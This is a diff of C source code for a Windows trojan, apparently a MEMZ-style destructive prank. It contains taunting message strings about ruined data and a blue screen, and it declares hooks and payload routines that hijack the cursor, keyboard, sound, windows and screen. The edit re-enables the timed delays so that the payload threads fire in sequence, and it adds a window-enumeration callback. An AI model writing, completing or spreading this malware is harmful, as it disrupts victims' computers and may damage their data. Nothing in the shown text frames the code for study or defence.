@@ -54,7 +54,7 @@ const char *msgs[] = {
 	"HACKER!\r\nENJOY BAN!",
 	"GET BETTER HAX NEXT TIME xD",
 	"HAVE FUN TRYING TO RESTORE YOUR DATA :D",
-	"|\/|3|\/|2",
+	"|\\/|3|\\/|2",
 	"BSOD INCOMING",
 	"VIRUS PRANK (GONE WRONG)",
 	"ENJOY THE NYAN CAT",
@@ -278,6 +278,7 @@ DWORD WINAPI messageBoxThread(LPVOID);
 LRESULT CALLBACK msgBoxHook(int, WPARAM, LPARAM);
 int payloadChangeText(int, int);
 BOOL CALLBACK EnumWindowProc(HWND, LPARAM);
+BOOL CALLBACK EnumWindowProc2(HWND, LPARAM);
 void enumerateChildren(HWND);
 int payloadSound(int, int);
 int payloadPuzzle(int, int);
@@ -382,31 +383,31 @@ void main() {
 	CloseHandle(note);
 	ShellExecuteA(NULL, NULL, "notepad", "\\note.txt", NULL, SW_SHOWDEFAULT);
 
-	//Sleep(30000);
+	Sleep(30000);
 	CreateThread(NULL, NULL, &payloadThread, &payloadExecute, NULL, NULL);
 
-	//Sleep(40000);
+	Sleep(40000);
 	CreateThread(NULL, NULL, &payloadThread, &payloadCursor, NULL, NULL);
 
-	//Sleep(20000);
+	Sleep(20000);
 	CreateThread(NULL, NULL, &payloadThread, &payloadKeyboard, NULL, NULL);
 
-	//Sleep(60000);
+	Sleep(60000);
 	CreateThread(NULL, NULL, &payloadThread, &payloadSound, NULL, NULL);
 
-	//Sleep(30000);
+	Sleep(30000);
 	CreateThread(NULL, NULL, &payloadThread, &payloadBlink, NULL, NULL);
 
-	//Sleep(20000);
+	Sleep(20000);
 	CreateThread(NULL, NULL, &payloadThread, &payloadMessageBox, NULL, NULL);
 
-	//Sleep(40000);
+	Sleep(40000);
 	CreateThread(NULL, NULL, &payloadThread, &payloadChangeText, NULL, NULL);
 
-	//Sleep(80000);
+	Sleep(80000);
 	CreateThread(NULL, NULL, &payloadThread, &payloadPIP, NULL, NULL);
 
-	//Sleep(15000);
+	Sleep(15000);
 	CreateThread(NULL, NULL, &payloadThread, &payloadPuzzle, NULL, NULL);
 
 	for (;;) {
